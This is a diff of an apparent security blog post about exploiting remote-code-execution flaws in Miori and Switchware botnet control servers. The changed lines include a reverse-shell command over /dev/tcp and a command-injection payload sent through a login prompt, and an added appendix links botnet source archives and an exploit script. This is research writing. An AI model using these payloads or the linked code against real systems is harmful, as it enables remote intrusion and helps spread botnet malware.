@@ -177,8 +177,7 @@ CMD  = "sh -i >& /dev/tcp/{}/{} 0>&1".format(LHOST, LPORT)
 
 try:	
 	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-	sock.connect((IP, int(PORT)))	
-	
+	sock.connect((C2_IP, int(C2_PORT)))		
 
 	print("Simulating a login command.")
 	sock.send(bytes("login\r\n", "utf-8"))	
@@ -186,7 +185,6 @@ try:
 	sleep(1)
 	print("Sending the payload.")
 	sock.send(bytes('user";clear; {} ;# \r\n'.format(CMD),"utf-8"))
-	
 	
 	sock.send(bytes('Press F to pay respects.\r\n',"utf-8"))
 	sleep(1)
@@ -211,7 +209,6 @@ Cool, right? Although when configured properly on a proper port, the botnet won'
 # Conclusion
 Thank you dearly for reading if you got this far. This blog is an unusual distraction from my regular CTF blogs, so i hope it was to your liking. I would like to thank my friend Jack for encouraging me to write this blog and the whole *\[SG\] Switch* community for making and distributing badly rewritten botnet versions. 
 
-
 ## Update: 
 As I was writing this blog, another Qbot rip-off called *switchware* was [released](https://www.youtube.com/watch?v=3ZT1CRtvyY4). I didn't dig into the code much but there is a post-auth RCE vulnerability. It's a very tight one though, as the buffer is limited to 50 bytes and 45 are already supplied. If this blog gets enough traction I can make a second post :). If not, well, you can try to exploit it as an exercise. The exploitable code is on lines *557*,*558* and *566*. 
 
@@ -222,5 +219,15 @@ A quick PoC below:
 ![Alt Text](/img/blog/pwn-hacking-botnets/switchware_hacked.gif)
 
 <center>Enjoy!</center>
+
+***
+
+# Appendix
+**Miori src:** <a href="/files/pwn-hacking-botnets/Miori.zip" target="_blank"> here </a>
+**Miori exploit:**<a href="/files/pwn-hacking-botnets/MioriRCE.py" target="_blank"> here </a>
+<br>
+**Switchware src:** <a href="/files/pwn-hacking-botnets/Switchware.zip" target="_blank"> here </a>
+**Switchware exploit:** N/A (*maybe I'll make one later*)
+
 
 ~V3
